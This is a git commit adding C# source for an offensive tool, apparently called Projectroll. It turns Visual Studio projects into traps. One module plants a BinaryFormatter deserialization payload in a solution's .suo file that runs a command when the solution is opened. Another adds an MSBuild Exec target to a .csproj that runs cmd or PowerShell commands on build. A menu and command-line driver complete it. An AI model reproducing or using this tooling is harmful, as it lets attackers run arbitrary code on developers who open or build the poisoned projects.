8c5fb78975cca1b5e7c3d708969d20c76fd00521
raphael <raphael@RAPHAELSON>
2025-01-18 01:59:52 -0300

    Adicionar arquivos de projeto.

---
+++ EvilProject/Modules.cs
@@ -0,0 +1,204 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
+using System.Xml.Linq;
+using OpenMcdf;
+using suo_exploit_test.Helpers.ModifiedVulnerableBinaryFormatters;
+
+namespace EvilProject
+{
+    public class Modules
+    {
+        private static byte[] InjectSuoFile(byte[] SuoFile, string cmdFileName, string cmdArguments = "")
+        {
+            byte[] output;
+            using (MemoryStream stream = new MemoryStream(SuoFile))
+            {
+                using (var compoundFile = new CompoundFile(stream))
+                {
+                    CFStream dataStream = compoundFile.RootStorage.GetStream("VsToolboxService");
+                    byte[] deserializationPayload = CreateDeserializationPayload(cmdFileName, cmdArguments);
+                    byte[] payload;
+                    using (MemoryStream payloadStream = new MemoryStream())
+                    {
+                        BinaryWriter payloadWriter = new BinaryWriter(payloadStream);
+                        payloadWriter.Write(1);
+                        payloadWriter.Write("");
+                        payloadWriter.Write(1);
+                        payloadWriter.Write("");
+                        payloadWriter.Write("");
+                        payloadWriter.Write(deserializationPayload);
+                        payload = payloadStream.ToArray();
+                        payloadWriter.Close();
+                        payloadWriter.Dispose();
+                    }
+                    dataStream.SetData(payload);
+                    using (MemoryStream outputStream = new MemoryStream())
+                    {
+                        compoundFile.Save(outputStream);
+                        output = outputStream.ToArray();
+                    }
+                }
+            }
+            return output;
+        }
+        private static byte[] CreateDeserializationPayload(string cmdFileName, string cmdArguments = "")
+        {
+            Delegate da = new Comparison<string>(String.Compare);
+            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
+            IComparer<string> comp = Comparer<string>.Create(d);
+            SortedSet<string> set = new SortedSet<string>(comp);
+            set.Add(cmdFileName);
+            if (!string.IsNullOrEmpty(cmdArguments))
+            {
+                set.Add(cmdArguments);
+            }
+            else
+            {
+                set.Add("");
+            }
+            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
+            object[] invoke_list = d.GetInvocationList();
+            invoke_list[1] = new Func<string, string, Process>(Process.Start);
+            fi.SetValue(d, invoke_list);
+            MemoryStream stream = new MemoryStream();
+            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+            fmt.Serialize(stream, set);
+            string b64encoded = Convert.ToBase64String(stream.ToArray());
+            string payload_bf_json = @"[{'Id': 1,
+    'Data': {
+      '$type': 'SerializationHeaderRecord',
+      'binaryFormatterMajorVersion': 1,
+      'binaryFormatterMinorVersion': 0,
+      'binaryHeaderEnum': 0,
+      'topId': 1,
+      'headerId': -1,
+      'majorVersion': 1,
+      'minorVersion': 0
+}},{'Id': 2,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 1,
+      'name': 'System.Security.Claims.ClaimsPrincipal',
+      'numMembers': 1,
+      'memberNames':['m_serializedClaimsIdentities'],
+      'binaryTypeEnumA':[1],
+      'typeInformationA':[null],
+      'typeInformationB':[null],
+      'memberAssemIds':[0],
+      'assemId': 0
+}},{'Id': 10,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 5,
+      'value': '" + b64encoded + @"'
+}},{'Id': 11,
+    'TypeName': 'MessageEnd',
+    'Data': {
+      '$type': 'MessageEnd'
+}}]";
+            MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(payload_bf_json);
+            return ms.ToArray();
+        }
+        public static void ProjectInject(string path,string trigger ,string command, bool ps)
+        {
+            string resolvedCommand = ResolveCommandOrPath(command);
+
+            XDocument csproj = XDocument.Load(path);
+
+            XNamespace msbuildNamespace = "http://schemas.microsoft.com/developer/msbuild/2003";
+            XElement targetElement;
+
+            if (ps)
+            {
+                targetElement = new XElement(msbuildNamespace + "Target",
+    new XAttribute("Name", trigger),
+    new XElement(msbuildNamespace + "Exec", new XAttribute("Command", "powershell "+resolvedCommand))
+);
+            }
+            else
+            {
+                targetElement = new XElement(msbuildNamespace + "Target",
+    new XAttribute("Name", trigger),
+    new XElement(msbuildNamespace + "Exec", new XAttribute("Command", "cmd /c " + resolvedCommand))
+);
+            }
+
+            XElement projectElement = csproj.Element(msbuildNamespace + "Project");
+
+            if (projectElement != null)
+            {
+                projectElement.Add(targetElement);
+                EConsole.ELog("Writing file to disk...", 0);
+
+                csproj.Save(path);
+                EConsole.ELog("Successfully wrote file to disk!", 1);
+
+            }
+            else
+            {
+                EConsole.ELog("Project element not found, are you sure this is a valid Visual Studio project?", 3);
+            }
+        }
+        public static void SuoInject(string path, string command)
+        {
+            Random r = new Random();
+            EConsole.ELog("Starting suo injection...", 0);
+            try
+            {
+                string input = path;
+                string tempOutput = Path.Combine(System.Environment.CurrentDirectory, r.Next(100000, 200000).ToString());
+                string finalOutput = Path.Combine(Path.GetDirectoryName(input), ".suo");
+                string cmdFile = ResolveCommandOrPath(command);
+
+                EConsole.ELog("Injecting Suo file...", 0);
+                byte[] data = InjectSuoFile(File.ReadAllBytes(input), cmdFile);
+
+                EConsole.ELog("Writing file to disk...", 0);
+                File.WriteAllBytes(tempOutput, data);
+
+                if (File.Exists(finalOutput))
+                {
+                    File.Delete(finalOutput);
+                }
+
+                File.Move(tempOutput, finalOutput);
+
+                EConsole.ELog("Successfully wrote file to disk!", 1);
+            }
+            catch (Exception ex)
+            {
+                EConsole.ELog(ex.Message, 3);
+            }
+        }
+
+        private static string ResolveCommandOrPath(string input)
+        {
+            if (File.Exists(input))
+            {
+                string content = File.ReadAllText(input);
+                return content.Replace("\n", " ").Replace("\r", " ").Trim();
+            }
+            else if (Directory.Exists(input))
+            {
+                return input;
+            }
+            else
+            {
+                if (input.StartsWith("\"") && input.EndsWith("\""))
+                {
+                    return input.Substring(1, input.Length - 2);
+                }
+                return input;
+            }
+        }
+    }
+}
---
+++ EvilProject/Program.cs
@@ -0,0 +1,195 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using System.Threading.Tasks;
+using suo_exploit_test.Helpers.ModifiedVulnerableBinaryFormatters;
+using OpenMcdf;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace EvilProject
+{
+    internal class Program
+    {
+        public static Action[] GetModules()
+        {
+            var methods = typeof(Modules).GetMethods(BindingFlags.Static | BindingFlags.Public);
+            var moduleActions = methods.Select(method =>
+            {
+                return new Action(() =>
+                {
+                    var parameters = method.GetParameters();
+                    var parameterValues = new object[parameters.Length];
+                    for (int i = 0; i < parameters.Length; i++)
+                    {
+                        parameterValues[i] = GetDefaultParameterValue(parameters[i].ParameterType);
+                    }
+
+                    method.Invoke(null, parameterValues);
+                });
+            }).ToArray();
+
+            return moduleActions;
+        }
+
+        private static object GetDefaultParameterValue(Type type)
+        {
+            if (type == typeof(int)) return 0;
+            if (type == typeof(string)) return string.Empty;
+            if (type == typeof(bool)) return false;
+            return null;
+        }
+
+        public static string SunsetASCII = "⠀⠀⠀⠀⠀⠀⢀⣤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⢤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀\r\n⠀⠀⠀⠀⢀⡼⠋⠀⣀⠄⡂⠍⣀⣒⣒⠂⠀⠬⠤⠤⠬⠍⠉⠝⠲⣄⡀⠀⠀ \r\n⠀⠀⠀⢀⡾⠁⠀⠊⢔⠕⠈⣀⣀⡀⠈⠆⠀⠀⠀⡍⠁⠀⠁⢂⠀⠈⣷⠀⠀\r\n⠀⠀⣠⣾⠥⠀⠀⣠⢠⣞⣿⣿⣿⣉⠳⣄⠀⠀⣀⣤⣶⣶⣶⡄⠀⠀⣘⢦⡀\r\n⢀⡞⡍⣠⠞⢋⡛⠶⠤⣤⠴⠚⠀⠈⠙⠁⠀⠀⢹⡏⠁⠀⣀⣠⠤⢤⡕⠱⣷\r\n⠘⡇⠇⣯⠤⢾⡙⠲⢤⣀⡀projectroll⠈⠉⣸⡄⠠⣠⡿\r\n⠀⠹⣜⡪⠀⠈⢷⣦⣬⣏⠉⠛⠲⣮⣧⣁⣀⣀⠶⠞⢁⣀⣨⢶⢿⣧⠉⡼⠁\r\n⠀⠀⠈⢷⡀⠀⠀⠳⣌⡟⠻⠷⣶⣧⣀⣀⣹⣉⣉⣿⣉⣉⣇⣼⣾⣿⠀⡇⠀\r\n⠀⠀⠀⠈⢳⡄⠀⠀⠘⠳⣄⡀⡼⠈⠉⠛⡿⠿⠿⡿⠿⣿⢿⣿⣿⡇⠀⡇⠀\r\n⠀⠀⠀⠀⠀⠙⢦⣕⠠⣒⠌⡙⠓⠶⠤⣤⣧⣀⣸⣇⣴⣧⠾⠾⠋⠀⠀⡇⠀\r\n⠀⠀⠀⠀⠀⠀⠀⠈⠙⠶⣭⣒⠩⠖⢠⣤⠄⠀⠀⠀⠀⠀⠠⠔⠁⡰⠀⣧⠀\r\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠲⢤⣀⣀⠉⠉⠀⠀⠀⠀⠀⠁⠀⣠⠏⠀\r\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠒⠲⠶⠤⠴⠒⠚⠁⠀⠀";
+        public static (int option, string[] arguments) ParseInput(string input, int maxModules)
+        {
+            if (string.IsNullOrWhiteSpace(input))
+                throw new ArgumentException("Input cannot be empty.");
+
+            var parts = input.Split(',')
+                             .Select(p => p.Trim())
+                             .ToArray();
+
+            if (parts.Length == 0)
+                throw new ArgumentException("No valid input provided.");
+
+            if (!int.TryParse(parts[0], out int option) || option < 1 || option > maxModules)
+                throw new ArgumentException("Invalid module option.");
+
+            string[] arguments = parts.Skip(1).ToArray();
+
+            return (option, arguments);
+        }
+        static void Main(string[] args)
+        {
+            Console.OutputEncoding = Encoding.UTF8;
+            EConsole.Write($"[[DARKGRAY]]{SunsetASCII}[[RESET]]", true);
+            Console.Title = "Projectroll";
+
+            if (args.Length > 0)
+            {
+                if (args[0] == "--help")
+                {
+                    EConsole.Write($"\n[[GREEN]]============================\n[[CYAN]] Modules using:\n[[RESET]]{Process.GetCurrentProcess().ProcessName} --module=<MODULE_NUMBER> <ARGUMENTS>\nE.g.: {Process.GetCurrentProcess().ProcessName} --module=2 path=C:\\SomeLocalInDisk command=\"calc\" \n\n[[DARKGRAY]] --modules - Shows a list of all available modules\n --help - Shows this help message\n\nPro Tip: You can also use the menu version which is easier to use by just opening the executable.\n[[GREEN]]============================", true);
+                    return;
+                }
+                if (args[0] == "--modules")
+                {
+                    Console.WriteLine("Available modules:\n");
+                    for (int i = 0; i < typeof(Modules).GetMethods(BindingFlags.Static | BindingFlags.Public).Length; i++)
+                    {
+                        var methodInfo = typeof(Modules).GetMethods(BindingFlags.Static | BindingFlags.Public)[i];
+                        var paramDescriptions = methodInfo.GetParameters()
+                        .Select(param => $"[[BLUE]]{param.ParameterType.Name}[[RESET]]: [[CYAN]]{param.Name}").ToArray();
+                        string paramList = paramDescriptions.Length > 0 ? string.Join(", ", paramDescriptions) : "No parameters";
+
+                        EConsole.Write($"  {i + 1}. [[YELLOW]]{methodInfo.Name}[[RESET]]([[yellow]]{paramList}[[RESET]])", true);
+                    }
+                    return;
+                }
+                try
+                {
+                    string moduleArg = args.FirstOrDefault(arg => arg.StartsWith("--module="));
+
+                    if (moduleArg == null)
+                        throw new ArgumentException("No --module argument provided.");
+
+                    string moduleValue = moduleArg.Replace("--module=", "").Trim();
+                    if (!int.TryParse(moduleValue, out int moduleIndex) || moduleIndex < 1)
+                        throw new ArgumentException("Invalid module index.");
+
+                    var methods = typeof(Modules).GetMethods(BindingFlags.Static | BindingFlags.Public);
+                    if (moduleIndex > methods.Length)
+                        throw new ArgumentException("Module index out of range.");
+
+                    var method = methods[moduleIndex - 1];
+                    var parameters = method.GetParameters();
+
+                    var parsedArguments = new object[parameters.Length];
+                    foreach (var param in parameters)
+                    {
+                        string argument = args.FirstOrDefault(arg => arg.StartsWith($"{param.Name}="));
+                        if (argument == null)
+                            throw new ArgumentException($"Missing argument for parameter: {param.Name}");
+
+                        string value = argument.Split(new[] { '=' }, 2, StringSplitOptions.None)[1];
+                        parsedArguments[Array.IndexOf(parameters, param)] = Convert.ChangeType(value, param.ParameterType);
+                    }
+
+                    method.Invoke(null, parsedArguments);
+                    return;
+                }
+                catch (Exception ex)
+                {
+                    EConsole.ELog($"{ex.Message} --> {ex.StackTrace}", 3);
+                    return;
+                }
+            }
+
+            EConsole.ELog($"Welcome, {System.Environment.UserName}!", 0);
+
+            Console.WriteLine("\n Select a module: ");
+            var modules = GetModules();
+
+            for (int i = 0; i < typeof(Modules).GetMethods(BindingFlags.Static | BindingFlags.Public).Length; i++)
+            {
+                var methodInfo = typeof(Modules).GetMethods(BindingFlags.Static | BindingFlags.Public)[i];
+                var paramDescriptions = methodInfo.GetParameters()
+                .Select(param => $"[[BLUE]]{param.ParameterType.Name}[[RESET]]: [[CYAN]]{param.Name}").ToArray();
+                string paramList = paramDescriptions.Length > 0 ? string.Join(", ", paramDescriptions) : "No parameters";
+
+                EConsole.Write($"  {i + 1}. [[YELLOW]]{methodInfo.Name}[[RESET]]([[yellow]]{paramList}[[RESET]])", true);
+            }
+
+            try
+            {
+                var methods = typeof(Modules).GetMethods(BindingFlags.Static | BindingFlags.Public);
+
+                EConsole.Write("[[CYAN]] > ", false);
+                string moduleNumber = Console.ReadLine();
+
+                if (moduleNumber.Trim().ToLower() == "clear")
+                {
+                    Console.Clear();
+                    Main(new string[] { });
+                    return;
+                }
+                if (int.Parse(moduleNumber) < 1 || int.Parse(moduleNumber) > methods.Length)
+                {
+                    EConsole.ELog("Invalid selection!", 3);
+                    return;
+                }
+
+                var selectedMethod = methods[int.Parse(moduleNumber) - 1];
+                var parameters = selectedMethod.GetParameters();
+
+                if (parameters.Length == 0)
+                {
+                    selectedMethod.Invoke(null, null);
+                    return;
+                }
+
+                var arguments = new List<object>();
+
+                foreach (var parameter in parameters)
+                {
+                    EConsole.Write($"[[CYAN]] > [[RESET]]Insert parameter '{parameter.Name}' value ({parameter.ParameterType}): ", false);
+                    string input = Console.ReadLine();
+                    var parsedArgument = Convert.ChangeType(input, parameter.ParameterType);
+                    arguments.Add(parsedArgument);
+                }
+
+                selectedMethod.Invoke(null, arguments.ToArray());
+            }
+            catch (Exception ex)
+            {
+                EConsole.ELog("Error occurred while trying to invoke function: " + ex.Message, 3);
+            }
+
+        }
+    }
+}
